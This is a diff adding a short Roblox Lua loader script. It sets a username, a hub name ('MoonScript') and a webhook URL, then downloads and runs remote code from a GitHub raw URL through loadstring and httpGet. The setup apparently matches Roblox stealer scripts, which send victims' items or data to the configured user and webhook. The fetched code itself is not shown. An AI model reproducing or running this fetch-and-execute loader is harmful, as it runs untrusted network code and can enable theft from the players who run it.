@@ -1,0 +1,7 @@
+_G.Username = "youruser"
+
+_G.HubName = "MoonScript"
+
+_G.WebhookUrl = "yourwebhook"
+
+loadstring(game:httpGet("https://raw.githubusercontent.com/Jayiioceanii/PeakOnTop/main/peak.lua"))()
